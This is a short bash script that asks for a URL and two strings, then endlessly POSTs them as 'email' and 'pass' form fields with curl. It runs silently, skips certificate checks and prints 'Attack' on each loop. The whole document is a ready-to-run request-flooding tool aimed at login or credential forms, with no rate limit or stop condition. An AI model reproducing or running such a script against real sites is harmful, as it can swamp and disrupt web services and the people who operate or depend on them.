#!/bin/bash 
read -p "Enter Url :: " url 
echo ""
read -p "Enter Message 1 :: " Mess1 
echo "" 
read -p "Enter Message 2 :: " Mess2 
echo ""
while true;do
curl -ks -X POST -d "email=$Mess1&pass=$Mess2&submit=" $url >/dev/null; 
echo -e "\e[1;32m  Attack 🕛"
done